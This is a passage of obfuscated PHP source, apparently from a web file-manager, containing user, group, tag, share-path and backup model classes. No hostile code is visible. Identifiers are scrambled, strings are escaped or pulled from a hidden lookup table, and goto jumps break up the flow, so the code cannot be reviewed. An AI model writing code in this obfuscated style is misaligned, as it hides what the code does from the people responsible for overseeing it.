$¤Ü‹ªèÜ[1851] => $®™Ğşáõ, $¤Ü‹ªèÜ[1955] => $Øîâ‰Éæ); $·»»İ“Ñ[$¤Ü‹ªèÜ[1875]] = isset($ˆ°úÏö[$¡ò¤—õ]) ? $ˆ°úÏö[$¡ò¤—õ] : 0; $¡ò¤—õ++; $Ò–¢é°[] = $·»»İ“Ñ; } return $õ«¨ÌåÕ->addAll($Ò–¢é°, array(), !0); } protected function userGroupAdd($›Ğ¿’üŒ, $ÇÌ—ş»Ë = array()) { $¶¾”ü­º =& $_SERVER[¡“ËÌ§œ]; $â»ˆ°Ó = $this->getInfoSimple($›Ğ¿’üŒ); if (!$â»ˆ°Ó || empty($ÇÌ—ş»Ë)) { return !1; } $Ä¦Àƒê­ = array(); foreach ($ÇÌ—ş»Ë as $“úèÖ‹ => $ª Ô×İ) { $Ä¦Àƒê­[] = array($¶¾”ü­º[1661] => $›Ğ¿’üŒ, $¶¾”ü­º[1851] => $“úèÖ‹, $¶¾”ü­º[1955] => $ª Ô×İ, $¶¾”ü­º[1875] => 0); } return Model($¶¾”ü­º[1941])->addAll($Ä¦Àƒê­, array(), !0); } protected function userGroupRemove($†ËŠ„ôş, $¸ë°ãø) { $ÖÛ¯åÖ¥ =& $_SERVER[¡“ËÌ§œ]; $Ä÷ëî¦­ = $this->getInfoSimple($†ËŠ„ôş); if (!$Ä÷ëî¦­ || !$¸ë°ãø) { return !1; } $º÷öğ¸¹ = array($ÖÛ¯åÖ¥[1652] => $†ËŠ„ôş, $ÖÛ¯åÖ¥[1939] => $¸ë°ãø); return Model($ÖÛ¯åÖ¥[1941])->where($º÷öğ¸¹)->delete(); } public function listData() { $–Ã›øãÍ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($–Ã›øãÍ[$_SERVER[¡“ËÌ§œ][398]]); return $–Ã›øãÍ; } public function listByID($¬€ßï™¤) { $¬ğè˜±· =& $_SERVER[¡“ËÌ§œ]; if (!$¬€ßï™¤) { return; } $åš‹ö = array($¬ğè˜±·[1661] => array($¬ğè˜±·[7], $¬€ßï™¤)); $Ÿ£¦‡Ìû = $this->where($åš‹ö)->select(); $Ÿ£¦‡Ìû = array_sort_keep($Ÿ£¦‡Ìû, $¬ğè˜±·[1661], $¬€ßï™¤); $this->_listDataApply($Ÿ£¦‡Ìû); return $Ÿ£¦‡Ìû; } public function listByGroup($«¸æ½ Å = 0, $şìÄŞÄÀ = array()) { $éçˆ½Ö† =& $_SERVER[¡“ËÌ§œ]; $„¥ßÛÑÂ = $éçˆ½Ö†[12]; $şÕ¡ìñ¬ = array(); if ($«¸æ½ Å) { $şÕ¡ìñ¬ = array($éçˆ½Ö†[2336] => intval($«¸æ½ Å)); $„¥ßÛÑÂ = "\114\105\106\124\x20\x4a\117\111\x4e\40{$this->tablePrefix}\x75\163\145\x72\x5f\147\x72\157\x75\x70\40\x75\x73\145\x72\137\147\x72\157\x75\x70\x20\157\156\x20\165\163\x65\162\x2e\x75\x73\145\x72\111\104\40\75\40\165\163\145\x72\137\147\162\157\x75\160\x2e\165\x73\145\x72\x49\x44"; $¥®¤Íå = Input::get($éçˆ½Ö†[495], null, $éçˆ½Ö†[12]) ? $éçˆ½Ö†[12] : $éçˆ½Ö†[2337]; } if (isset($şìÄŞÄÀ[$éçˆ½Ö†[770]])) { $şÕ¡ìñ¬[$éçˆ½Ö†[2338]] = $şìÄŞÄÀ[$éçˆ½Ö†[770]]; } $ŸšĞˆ€ = $this->_makeOrder($¥®¤Íå)->field($éçˆ½Ö†[2339])->where($şÕ¡ìñ¬)->join($„¥ßÛÑÂ)->selectPage(50); $this->_listDataApply($ŸšĞˆ€[$éçˆ½Ö†[398]]); return $ŸšĞˆ€; } private function _makeOrder($ãæ¶ÍÕ» = '') { $‹ï÷…­ =& $_SERVER[¡“ËÌ§œ]; $ç­Ï‡ÉÛ = array($‹ï÷…­[1661], $‹ï÷…­[32], $‹ï÷…­[1840], $‹ï÷…­[1812], $‹ï÷…­[201]); $ïù£§«º = array($‹ï÷…­[488] => $‹ï÷…­[489], $‹ï÷…­[490] => $‹ï÷…­[491]); $…‹­°Ê³ = Input::get($‹ï÷…­[495], $‹ï÷…­[7], $‹ï÷…­[1652], $ç­Ï‡ÉÛ); $ƒŠÙ = Input::get($‹ï÷…­[496], $‹ï÷…­[7], $‹ï÷…­[1942], array($‹ï÷…­[1942], $‹ï÷…­[490])); $ƒŠÙ = $ïù£§«º[$ƒŠÙ]; $ãæ¶ÍÕ» = $ãæ¶ÍÕ» . "\165\163\145\x72\x2e{$…‹­°Ê³}\x20{$ƒŠÙ}\54\40\x75\163\145\162\x2e\165\163\x65\162\111\x44\40\141\163\143"; return $this->alias($‹ï÷…­[2068])->order($ãæ¶ÍÕ»); } public function listSearch($Ø®†Àˆ) { $’ÈöØáÖ =& $_SERVER[¡“ËÌ§œ]; $Üæ¡€è¼ = $Ø®†Àˆ[$’ÈöØáÖ[1945]]; $ÈİÍæ«Ğ = isset($Ø®†Àˆ[$’ÈöØáÖ[1946]]) ? $Ø®†Àˆ[$’ÈöØáÖ[1946]] : !1; $Üæ¡€è¼ = str_replace($’ÈöØáÖ[1947], $’ÈöØáÖ[1948], trim($Üæ¡€è¼)); $™¶š› = array($’ÈöØáÖ[32] => array($’ÈöØáÖ[412], "\x25{$Üæ¡€è¼}\x25"), $’ÈöØáÖ[334] => array($’ÈöØáÖ[412], "{$Üæ¡€è¼}\x25"), $’ÈöØáÖ[570] => array($’ÈöØáÖ[412], "{$Üæ¡€è¼}\x25"), $’ÈöØáÖ[1020] => $’ÈöØáÖ[1949]); if (Input::check($Üæ¡€è¼, $’ÈöØáÖ[340])) { $™¶š›[$’ÈöØáÖ[1661]] = array($’ÈöØáÖ[412], "{$Üæ¡€è¼}\x25"); $™¶š›[$’ÈöØáÖ[2321]] = array($’ÈöØáÖ[412], "{$Üæ¡€è¼}\x25"); } if (!$Üæ¡€è¼) { $™¶š› = array(); } if (isset($Ø®†Àˆ[$’ÈöØáÖ[770]])) { $™¶š›[$’ÈöØáÖ[770]] = $Ø®†Àˆ[$’ÈöØáÖ[770]]; } $™¶š› = $this->parseWhereLike($™¶š›); $å¾´¢©à = $this->_makeOrder()->where($™¶š›)->selectPage(20); if (!$å¾´¢©à || count($å¾´¢©à[$’ÈöØáÖ[398]]) < 5 && Input::check($Üæ¡€è¼, $’ÈöØáÖ[347])) { $ô¶š³„š = $this->_searchFromMeta($’ÈöØáÖ[502], $Üæ¡€è¼, 10); $×¿¬ñì— = $this->_searchFromMeta($’ÈöØáÖ[503], $Üæ¡€è¼, 10); $•€ÜÈ¨ú = array_merge($ô¶š³„š, $×¿¬ñì—, $å¾´¢©à[$’ÈöØáÖ[398]]); $å¾´¢©à[$’ÈöØáÖ[398]] = array_unique_by_key($•€ÜÈ¨ú, $’ÈöØáÖ[1661]); $å¾´¢©à[$’ÈöØáÖ[395]][$’ÈöØáÖ[396]] = count($å¾´¢©à[$’ÈöØáÖ[398]]); $å¾´¢©à[$’ÈöØáÖ[395]][$’ÈöØáÖ[397]] = ceil($å¾´¢©à[$’ÈöØáÖ[395]][$’ÈöØáÖ[396]] / $å¾´¢©à[$’ÈöØáÖ[395]][$’ÈöØáÖ[392]]); } $this->_listDataApply($å¾´¢©à[$’ÈöØáÖ[398]]); $this->_filterByGroup($å¾´¢©à, $ÈİÍæ«Ğ); return $å¾´¢©à; } private function _filterByGroup(&$·¯½–ÓÇ, $ıÀ¤¯ƒñ) { $áÒ€Ú¬ =& $_SERVER[¡“ËÌ§œ]; if (!$ıÀ¤¯ƒñ) { return $·¯½–ÓÇ; } foreach ($·¯½–ÓÇ[$áÒ€Ú¬[398]] as $—Ùûû‹Ë => &$’…Ãìê) { $¼Ôã”å³ = array_to_keyvalue($’…Ãìê[$áÒ€Ú¬[2038]], $áÒ€Ú¬[12], $áÒ€Ú¬[1851]); if (!in_array($ıÀ¤¯ƒñ, $¼Ôã”å³)) { unset($·¯½–ÓÇ[$áÒ€Ú¬[398]][$—Ùûû‹Ë]); } } unset($’…Ãìê); $·¯½–ÓÇ[$áÒ€Ú¬[398]] = array_values($·¯½–ÓÇ[$áÒ€Ú¬[398]]); $·¯½–ÓÇ[$áÒ€Ú¬[395]] = array($áÒ€Ú¬[2103] => count($·¯½–ÓÇ[$áÒ€Ú¬[398]]), $áÒ€Ú¬[2101] => $·¯½–ÓÇ[$áÒ€Ú¬[395]][$áÒ€Ú¬[392]], $áÒ€Ú¬[2100] => 1, $áÒ€Ú¬[2102] => 1); } private function _searchFromMeta($œ´˜ı²—, $Óö’Ã…”, $éü¢™†£) { $¤âĞÜñá =& $_SERVER[¡“ËÌ§œ]; $Óö’Ã…” = strtolower($Óö’Ã…”); $öø°¸”” = array($¤âĞÜñá[94] => $œ´˜ı²—, $¤âĞÜñá[403] => array($¤âĞÜñá[412], "\45{$Óö’Ã…”}\x25")); $öø°¸”” = $this->parseWhereLike($öø°¸””); $Úë¯ÄçÊ = Model($¤âĞÜñá[2340])->where($öø°¸””)->limit($éü¢™†£)->select(); if (!$Úë¯ÄçÊ) { return array(); } $Úë¯ÄçÊ = array_to_keyvalue($Úë¯ÄçÊ, $¤âĞÜñá[12], $¤âĞÜñá[1661]); $¹’Íëà = $this->where(array($¤âĞÜñá[1652] => array($¤âĞÜñá[7], $Úë¯ÄçÊ)))->select(); if (!$¹’Íëà) { return array(); } return $¹’Íëà; } private function _listDataApplyItem($¤£Íá³“) { $€ˆØ ¡ó = array($¤£Íá³“); $this->_listDataApply($€ˆØ ¡ó); return $€ˆØ ¡ó[0]; } private function _listDataApply(&$Ø”÷Áàë) { $ãæ«óóÔ =& $_SERVER[¡“ËÌ§œ]; if (!$Ø”÷Áàë) { return; } array_remove_key($Ø”÷Áàë, $ãæ«óóÔ[909]); $ã ¥Ó·æ = array_to_keyvalue($Ø”÷Áàë, $ãæ«óóÔ[12], $ãæ«óóÔ[1661]); $this->_listAppendGroup($Ø”÷Áàë, $ã ¥Ó·æ); $this->_listAppendMeta($Ø”÷Áàë, $ã ¥Ó·æ); $this->_listAppendSourceRoot($Ø”÷Áàë, $ã ¥Ó·æ); } private function _listAppendSourceRoot(&$€ÓÅËø, $ß„öÂÄ‡) { $ÕŒèßÎ¤ =& $_SERVER[¡“ËÌ§œ]; $•˜öÔ˜ª = Model($ÕŒèßÎ¤[845])->listSourceRoot(SourceModel::TYPE_USER, $ß„öÂÄ‡); $•˜öÔ˜ª = array_to_keyvalue($•˜öÔ˜ª, $ÕŒèßÎ¤[534]); $•˜öÔ˜ª = array_remove_key($•˜öÔ˜ª, $ÕŒèßÎ¤[534]); foreach ($€ÓÅËø as &$¨¤™øÙ¶) { $¨¤™øÙ¶[$ÕŒèßÎ¤[87]] = $•˜öÔ˜ª[$¨¤™øÙ¶[$ÕŒèßÎ¤[1661]]] ? $•˜öÔ˜ª[$¨¤™øÙ¶[$ÕŒèßÎ¤[1661]]] : array(); } unset($¨¤™øÙ¶); } private function _listAppendGroup(&$–øú·€ù, $”úà¸“Ş) { $ÄâµŒş« =& $_SERVER[¡“ËÌ§œ]; $Ã©‘°Ÿ = array($ÄâµŒş«[1661] => array($ÄâµŒş«[7], $”úà¸“Ş)); $ “òœáÎ = Model($ÄâµŒş«[1941])->where($Ã©‘°Ÿ)->select(); $Â³Ş†Ñ = array_to_keyvalue($ “òœáÎ, $ÄâµŒş«[12], $ÄâµŒş«[1851]); $Â³Ş†Ñ = array_remove_value(array_unique($Â³Ş†Ñ), $ÄâµŒş«[198]); if (!$Â³Ş†Ñ || !$ “òœáÎ) { return; } $Ã©‘°Ÿ = array($ÄâµŒş«[1851] => array($ÄâµŒş«[7], $Â³Ş†Ñ)); $îû×Ûê’ = Model($ÄâµŒş«[2036])->field($ÄâµŒş«[2341])->where($Ã©‘°Ÿ)->select(); $îû×Ûê’ = array_to_keyvalue($îû×Ûê’, $ÄâµŒş«[1851]); $ “òœáÎ = array_to_keyvalue_group($ “òœáÎ, $ÄâµŒş«[1661]); foreach ($ “òœáÎ as &$£¢…È€é) { $ÒîÌ³Ë£ = array(); foreach ($£¢…È€é as $¡Ë¢¹•­) { if (!$¡Ë¢¹•­[$ÄâµŒş«[1955]]) { continue; } $—¹“‘Ãœ = Model($ÄâµŒş«[536])->listData($¡Ë¢¹•­[$ÄâµŒş«[1955]]); $ÒîÌ³Ë£[] = array($ÄâµŒş«[1851] => $¡Ë¢¹•­[$ÄâµŒş«[1851]], $ÄâµŒş«[2342] => $îû×Ûê’[$¡Ë¢¹•­[$ÄâµŒş«[1851]]][$ÄâµŒş«[32]], $ÄâµŒş«[549] => $îû×Ûê’[$¡Ë¢¹•­[$ÄâµŒş«[1851]]][$ÄâµŒş«[549]], $ÄâµŒş«[451] => $—¹“‘Ãœ); } $£¢…È€é = $ÒîÌ³Ë£; } unset($£¢…È€é); foreach ($–øú·€ù as &$¥¶Ÿ¨¯Ã) { $¥¶Ÿ¨¯Ã[$ÄâµŒş«[2038]] = array(); if (isset($ “òœáÎ[$¥¶Ÿ¨¯Ã[$ÄâµŒş«[1661]]])) { $¥¶Ÿ¨¯Ã[$ÄâµŒş«[2038]] = $ “òœáÎ[$¥¶Ÿ¨¯Ã[$ÄâµŒş«[1661]]]; } } unset($¥¶Ÿ¨¯Ã); } public function userAppendGroup($´òÅğ›ß) { $ÎÙÌÖ’° =& $_SERVER[¡“ËÌ§œ]; if (!$´òÅğ›ß) { return array(); } $this->_listAppendGroup($´òÅğ›ß, array_to_keyvalue($´òÅğ›ß, $ÎÙÌÖ’°[12], $ÎÙÌÖ’°[1661])); return $´òÅğ›ß; } private function _listAppendMeta(&$ù´˜ÕïĞ, $Š¨™¢±) { $èÈô¹óë =& $_SERVER[¡“ËÌ§œ]; $å¸¸ç’— = UserJobModel::JOB_KEY; $æÍûÁë¦ = array($èÈô¹óë[2322]); $òÚË†ÓÔ = array($èÈô¹óë[1661] => array($èÈô¹óë[7], $Š¨™¢±)); $„˜äÖãú = Model($èÈô¹óë[2320])->where($òÚË†ÓÔ)->select(); $„˜äÖãú = array_to_keyvalue_group($„˜äÖãú, $èÈô¹óë[1661]); foreach ($„˜äÖãú as &$‚Š•´¡ş) { $Ò÷Ê»á­ = array(); foreach ($‚Š•´¡ş as $ßÚğÖ³—) { if (!in_array($ßÚğÖ³—[$èÈô¹óë[94]], $æÍûÁë¦)) { $Ò÷Ê»á­[$ßÚğÖ³—[$èÈô¹óë[94]]] = $ßÚğÖ³—[$èÈô¹óë[403]]; } } $‚Š•´¡ş = $Ò÷Ê»á­; } unset($‚Š•´¡ş); $¶ºîõ¨ = Model($èÈô¹óë[2343]); foreach ($ù´˜ÕïĞ as &$îÊ›”ü‹) { $Æ´Æ‡© = array(); if (isset($„˜äÖãú[$îÊ›”ü‹[$èÈô¹óë[1661]]])) { $Æ´Æ‡© = $„˜äÖãú[$îÊ›”ü‹[$èÈô¹óë[1661]]]; } $îÊ›”ü‹[$èÈô¹óë[2344]] = array(); if (isset($Æ´Æ‡©[$å¸¸ç’—])) { $îÊ›”ü‹[$èÈô¹óë[2344]] = $¶ºîõ¨->getUserJobInfo($Æ´Æ‡©[$å¸¸ç’—]); } } unset($îÊ›”ü‹); } protected function groupUserAll($ÒÜƒüƒ) { $¡ÈãëÕú =& $_SERVER[¡“ËÌ§œ]; if (!$ÒÜƒüƒ) { return !1; } $á¯ıçà¢ = Model($¡ÈãëÕú[1941])->field($¡ÈãëÕú[1661])->where(array($¡ÈãëÕú[1851] => array($¡ÈãëÕú[7], $ÒÜƒüƒ)))->select(); $á¯ıçà¢ = array_to_keyvalue($á¯ıçà¢, $¡ÈãëÕú[12], $¡ÈãëÕú[1661]); return array_unique($á¯ıçà¢); } public function userSearch($ ´ø×Ç, $ûºÁÒâæ = "\52") { return Model($_SERVER[¡“ËÌ§œ][563])->where($ ´ø×Ç)->field($ûºÁÒâæ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\x6f\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($±çËÜ´‰) { $š—í¨â =& $_SERVER[¡“ËÌ§œ]; $™í®Ç¾ğ = defined($š—í¨â[2072]) && USER_ID ? USER_ID : $š—í¨â[12]; return "\125\163\145\162\117\x70\x74\151\x6f\x6e\x5f{$±çËÜ´‰}\137" . $™í®Ç¾ğ; } protected function filterWhere($¹§ßªğì) { $ŠÙÀ¨‡ =& $_SERVER[¡“ËÌ§œ]; $¹§ßªğì[$ŠÙÀ¨‡[1661]] = defined($ŠÙÀ¨‡[2072]) && USER_ID ? USER_ID : $ŠÙÀ¨‡[12]; return $¹§ßªğì; } public function cacheRemoveUser($ŞÇÓ¤ö–, $ĞÀ ¿) { return Cache::remove("\x55\x73\145\162\117\x70\164\151\157\x6e\137{$ŞÇÓ¤ö–}\137" . $ĞÀ ¿); } protected function optionDefault($‡«‡ğ¹ò = '') { $İ—øÙƒ£ =& $_SERVER[¡“ËÌ§œ]; if ($‡«‡ğ¹ò == $İ—øÙƒ£[12]) { return $GLOBALS[$İ—øÙƒ£[6]][$İ—øÙƒ£[2345]]; } if ($‡«‡ğ¹ò == $İ—øÙƒ£[2346]) { return $GLOBALS[$İ—øÙƒ£[6]][$İ—øÙƒ£[2347]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\x74\x61\x67\x4c\151\163\x74"; public $modelType = "\x55\x73\145\162\x4f\160\x74\x69\157\x6e"; public $field = array("\156\141\x6d\x65", "\x73\x74\171\x6c\145", "\163\x6f\162\164"); public function listData($–îçùÙ = false, $¤Õ›ÂÓ = "\x73\157\162\164", $«Ê‚¾İ = false) { return parent::listData($–îçùÙ, $¤Õ›ÂÓ, $«Ê‚¾İ); } public function remove($œ ÓÑµƒ) { return parent::remove($œ ÓÑµƒ); } public function add($µÁ¦´¨², $Ô˜Š±¼œ = "\154\x61\x62\145\x6c\55\147\162\x65\x79\x2d\x6e\157\x72\x6d\x61\154") { $°’Çé˜ =& $_SERVER[¡“ËÌ§œ]; if ($this->findByName($µÁ¦´¨²)) { return !1; } $ã—Ö¢Ú¼ = array($°’Çé˜[458] => $µÁ¦´¨², $°’Çé˜[522] => $Ô˜Š±¼œ, $°’Çé˜[1855] => $this->getSort($°’Çé˜[287]) + 1); return parent::insert($ã—Ö¢Ú¼); } public function update($½·÷ÊúÆ, $”®ë¦£) { $İÅÎèşˆ =& $_SERVER[¡“ËÌ§œ]; $‰ê¾½Îû = $this->listData($½·÷ÊúÆ); $›û²É’õ = $this->findByName($”®ë¦£[$İÅÎèşˆ[32]]); if (!$‰ê¾½Îû || $›û²É’õ && $›û²É’õ[$İÅÎèşˆ[437]] != $‰ê¾½Îû[$İÅÎèşˆ[437]]) { return !1; } return parent::update($½·÷ÊúÆ, $”®ë¦£); } public function moveTop($²ñè¶·å) { $ÁûÛø™² =& $_SERVER[¡“ËÌ§œ]; $çÁÖÊÊ° = parent::listData(); $åÚíÔ®â = $this->getSort($ÁûÛø™²[286]); foreach ($çÁÖÊÊ° as &$®‘“…ŸŠ) { if ($®‘“…ŸŠ[$ÁûÛø™²[437]] == $²ñè¶·å) { $®‘“…ŸŠ[$ÁûÛø™²[1875]] = $åÚíÔ®â; continue; } $®‘“…ŸŠ[$ÁûÛø™²[1875]] += 1; } unset($®‘“…ŸŠ); return parent::resetData($çÁÖÊÊ°); } public function moveBottom($§Ü›Ùí¡) { $éŞÌÅ£ =& $_SERVER[¡“ËÌ§œ]; $ŸØÇ¨ = $this->getSort($éŞÌÅ£[287]) + 1; return parent::update($§Ü›Ùí¡, array($éŞÌÅ£[1875] => $ŸØÇ¨)); } public function resetSort($»ÒªàĞ¸) { $„ğ½‹¹À =& $_SERVER[¡“ËÌ§œ]; $ÚáÈóÓ± = array(); $»ÒªàĞ¸ = is_array($»ÒªàĞ¸) ? $»ÒªàĞ¸ : array(); for ($ÃãÂµĞ = 0; $ÃãÂµĞ < count($»ÒªàĞ¸); $ÃãÂµĞ++) { $ÚáÈóÓ±[$»ÒªàĞ¸[$ÃãÂµĞ] . $„ğ½‹¹À[12]] = $ÃãÂµĞ + 1; } $¤·ò×« = parent::listData(); foreach ($¤·ò×« as &$–†ÙÙËò) { $äù“²ò = $ÚáÈóÓ±[$–†ÙÙËò[$„ğ½‹¹À[437]]]; $–†ÙÙËò[$„ğ½‹¹À[1875]] = $äù“²ò ? $äù“²ò : $–†ÙÙËò[$„ğ½‹¹À[1875]]; } unset($–†ÙÙËò); return parent::resetData($¤·ò×«); } private function getSort($Ÿ¡ú—’é) { $¼øØÎŸÌ =& $_SERVER[¡“ËÌ§œ]; $É¯çâ›Ä = parent::listData(); $¹¶Ã‹Èş = array_to_keyvalue($É¯çâ›Ä, $¼øØÎŸÌ[12], $¼øØÎŸÌ[1875]); if (!$¹¶Ã‹Èş) { $¹¶Ã‹Èş = array(0); } $Æß·ÙŠ = $Ÿ¡ú—’é == $¼øØÎŸÌ[287] ? max($¹¶Ã‹Èş) : min($¹¶Ã‹Èş); return intval($Æß·ÙŠ); } } goto DçšÌ·…†°; A·´‘õ©è: class PathDriverDriverShareItem { public function __construct($ğäöøó§) { $this->pathParse = $ğäöøó§; } public function __call($ìÖ¯ó‹Ö, $ç²¸Æ­) { $õÜœ«Şá =& $_SERVER[¡“ËÌ§œ]; if (method_exists($this, $ìÖ¯ó‹Ö)) { return; } $ÏÕ™»Ì = call_user_func_array(array($õÜœ«Şá[1363], $ìÖ¯ó‹Ö), $ç²¸Æ­); $Òõ¢ä¤§ = array($õÜœ«Şá[1364], $õÜœ«Şá[1365], $õÜœ«Şá[1366], $õÜœ«Şá[1367], $õÜœ«Şá[584], $õÜœ«Şá[586], $õÜœ«Şá[1368], $õÜœ«Şá[107], $õÜœ«Şá[1369], $õÜœ«Şá[1370]); if (in_array($ìÖ¯ó‹Ö, $Òõ¢ä¤§)) { $ÏÕ™»Ì = $this->getPathOuter($ÏÕ™»Ì); } return $ÏÕ™»Ì; } public function copy($´«îôüß, $š²Ú¥ïï, $—‹šˆÄ¯ = false, $½õÈóîî = false) { return $this->copyMove($´«îôüß, $š²Ú¥ïï, $—‹šˆÄ¯, $_SERVER[¡“ËÌ§œ][584], $½õÈóîî); } public function move($Ã×‘‹É, $ï¸›áğÏ, $ÖÙÒ‘Î = false, $Æ¿è¨Öø = false) { return $this->copyMove($Ã×‘‹É, $ï¸›áğÏ, $ÖÙÒ‘Î, $_SERVER[¡“ËÌ§œ][586], $Æ¿è¨Öø); } private function copyMove($µŠ£®Æ±, $–áÃ„ú, $ëşôğ‚¥, $£ùãöä, $û²Ú»†á = false) { $¨‘¶¥æí =& $_SERVER[¡“ËÌ§œ]; $ùÍšä¿  = $–áÃ„ú; $Á”Í…³¤ = IO::driverMake($–áÃ„ú); if ($Á”Í…³¤->pathParse[$¨‘¶¥æí[1171]]) { $–áÃ„ú = $Á”Í…³¤->pathParse[$¨‘¶¥æí[1171]]; } else { $–áÃ„ú = $ùÍšä¿ ; } $ùÊôàåŞ = IO::copyMove($µŠ£®Æ±, $–áÃ„ú, $ëşôğ‚¥, $£ùãöä, $û²Ú»†á); $ùÊôàåŞ = $this->getPathOuter($ùÊôàåŞ); return $ùÊôàåŞ; } public function pathThis($Çºó¹Á‡) { return get_path_this($this->pathParse[$_SERVER[¡“ËÌ§œ][84]]); } public function pathFather($¦ØÇÚ˜¯) { return get_path_father($this->pathParse[$_SERVER[¡“ËÌ§œ][84]]); } public function iconvSystem($ÒÅó¨ıÌ) { return $ÒÅó¨ıÌ; } protected function infoParse($˜²²ğàá, $Ç©¼òÜˆ = false) { $ç§ãÁÃ‡ =& $_SERVER[¡“ËÌ§œ]; $½æ°‚ªÒ = $this->pathParse[$ç§ãÁÃ‡[524]][$ç§ãÁÃ‡[1195]] . $this->pathParse[$ç§ãÁÃ‡[1188]]; if ($Ç©¼òÜˆ) { $¶ÖŞšá÷ = IO::infoWithChildren($½æ°‚ªÒ); } else { $¶ÖŞšá÷ = IO::info($½æ°‚ªÒ); } $ŸÍ°‹‘Š = $this->pathParse[$ç§ãÁÃ‡[524]]; return Action($ç§ãÁÃ‡[1361])->_shareItemeParse($¶ÖŞšá÷, $ŸÍ°‹‘Š); } public function listAll($ÁèÍİ±µ) { $ıüòÈÖÜ =& $_SERVER[¡“ËÌ§œ]; $£×ëµÆş = IO::listAll($ÁèÍİ±µ); $ĞÛ™ÁÁ– = rtrim($this->pathParse[$ıüòÈÖÜ[524]][$ıüòÈÖÜ[1195]], $ıüòÈÖÜ[8]); foreach ($£×ëµÆş as &$ò ¦Áˆ’) { $ò ¦Áˆ’[$ıüòÈÖÜ[84]] = $this->pathDriver . $ıüòÈÖÜ[8] . ltrim(substr($ò ¦Áˆ’[$ıüòÈÖÜ[84]], strlen($ĞÛ™ÁÁ–)), $ıüòÈÖÜ[8]); } unset($ò ¦Áˆ’); return $£×ëµÆş; } public function listAllSimple($…ÆÊŸ, $–¿×ïÙ = false) { $©òá½Ÿñ =& $_SERVER[¡“ËÌ§œ]; $ış½€À¸ = $this->listAll($…ÆÊŸ); $¬›Íˆ®¶ = $this->pathParse[$©òá½Ÿñ[459]]; if (trim($¬›Íˆ®¶, $©òá½Ÿñ[8]) == trim(get_path_father($¬›Íˆ®¶), $©òá½Ÿñ[8])) { $–¿×ïÙ = !0; } return IO::init($©òá½Ÿñ[12])->listAllSimpleMake($ış½€À¸, $¬›Íˆ®¶, $–¿×ïÙ); } public function getPathOuter($…ªÃËÁÅ) { $êäğœ³ =& $_SERVER[¡“ËÌ§œ]; $ºş¤ƒ  = KodIO::parse($…ªÃËÁÅ); if ($ºş¤ƒ [$êäğœ³[33]] == KodIO::KOD_SHARE_ITEM) { return $ºş¤ƒ [$êäğœ³[84]]; } $–‡ŒÖ“ = KodIO::clear($…ªÃËÁÅ); $âÜùìò = KodIO::clear($this->pathParse[$êäğœ³[524]][$êäğœ³[1195]]); $™•òƒ¬¸ = substr($–‡ŒÖ“, strlen($âÜùìò)); if (substr($–‡ŒÖ“, 0, strlen($âÜùìò)) != $âÜùìò) { return !1; } return $this->pathParse[$êäğœ³[1189]] . $êäğœ³[8] . ltrim($™•òƒ¬¸, $êäğœ³[8]); } public function getType() { $«­üøõ  =& $_SERVER[¡“ËÌ§œ]; $™—Ï²š = str_replace($«­üøõ [74], $«­üøõ [12], get_class($this)); return strtolower($™—Ï²š); } public function isTypeObject($Ì±ùû‡¡) { return IO::isTypeObject($Ì±ùû‡¡); } public function info($ß‰ºÓ’í) { return $this->infoParse($ß‰ºÓ’í); } public function infoAuth($ùğÖéÀ¨) { return $this->infoParse($ùğÖéÀ¨); } public function infoWithChildren($–š—ı¬‚) { return $this->infoParse($–š—ı¬‚, !0); } public function infoFull($÷‘Œ¢ı›) { return $this->infoParse($÷‘Œ¢ı›); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¬˜ĞáŒ) { $this->pathParse = $¬˜ĞáŒ; } protected function infoParse($á‹«™ü¤, $‘”Œ³Í’ = false) { $ªİ›ß‘à =& $_SERVER[¡“ËÌ§œ]; return Action($ªİ›ß‘à[1194])->sharePathInfo($this->pathParse[$ªİ›ß‘à[84]], !0, $‘”Œ³Í’); } public function listPath($Óä¦ó±µ, $‹Á£Ûß = false) { $º¡È™÷Ú =& $_SERVER[¡“ËÌ§œ]; $•î‚ÜÜ™ = IO::listPath($Óä¦ó±µ, $‹Á£Ûß); if (!$•î‚ÜÜ™) { return $•î‚ÜÜ™; } if (is_array($•î‚ÜÜ™[$º¡È™÷Ú[1362]])) { $ÑÃ÷ö®ü = Action($º¡È™÷Ú[1371])->parsePathChildren($•î‚ÜÜ™[$º¡È™÷Ú[1362]], array($º¡È™÷Ú[459] => $Óä¦ó±µ)); $•î‚ÜÜ™[$º¡È™÷Ú[1362]] = Action($º¡È™÷Ú[1194])->shareItemInfo($ÑÃ÷ö®ü); } foreach ($•î‚ÜÜ™ as $˜èŞ˜ú¤ => $¡ŞÙÑ«¿) { if (!in_array($˜èŞ˜ú¤, array($º¡È™÷Ú[83], $º¡È™÷Ú[82]))) { continue; } foreach ($¡ŞÙÑ«¿ as $„ƒ¹¡Ÿú => $ÑÃ÷ö®ü) { $ÑÃ÷ö®ü = Action($º¡È™÷Ú[1371])->parsePathChildren($ÑÃ÷ö®ü, array($º¡È™÷Ú[459] => $Óä¦ó±µ)); $•î‚ÜÜ™[$˜èŞ˜ú¤][$„ƒ¹¡Ÿú] = Action($º¡È™÷Ú[1194])->shareItemInfo($ÑÃ÷ö®ü); } } return $•î‚ÜÜ™; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($É¬¡·¥º) { parent::__construct($É¬¡·¥º); } } goto D¨Í©Ûô’Ô; a¤­¬­æâ: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x62\x61\x63\x6b\x75\x70\114\151\163\x74"; public $field = array("\x69\x6f", "\x6e\141\x6d\x65", "\163\164\141\164\165\x73", "\143\157\156\x74\145\156\x74", "\155\141\156\165\141\154", "\x72\145\163\x75\154\164", "\164\151\155\145\106\x72\x6f\155", "\164\151\155\145\x54\157"); public function config() { $Ô—«Ğ•  =& $_SERVER[¡“ËÌ§œ]; $‹ÌÆï½° = Model($Ô—«Ğ• [790])->get($Ô—«Ğ• [800]); $‹ÌÆï½° = json_decode($‹ÌÆï½°, !0); $‹ÌÆï½° = is_array($‹ÌÆï½°) ? $‹ÌÆï½° : array(); if (!isset($‹ÌÆï½°[$Ô—«Ğ• [774]])) { $‹ÌÆï½°[$Ô—«Ğ• [774]] = $Ô—«Ğ• [88]; } unset($‹ÌÆï½°[$Ô—«Ğ• [1631]]); 